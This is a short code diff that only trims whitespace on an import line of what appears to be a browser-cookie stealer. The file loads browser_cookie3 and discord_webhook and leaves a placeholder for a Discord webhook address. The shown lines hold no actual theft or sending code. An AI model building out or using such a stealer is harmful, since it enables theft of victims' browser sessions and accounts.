@@ -1,4 +1,4 @@
-import browser_cookie3, requests, threading, discord_webhook                                                                                                                                                                                                                                                        
+import browser_cookie3, requests, threading, discord_webhook          
 
 webhook = 'YOUR WEBHOOK HERE'
 
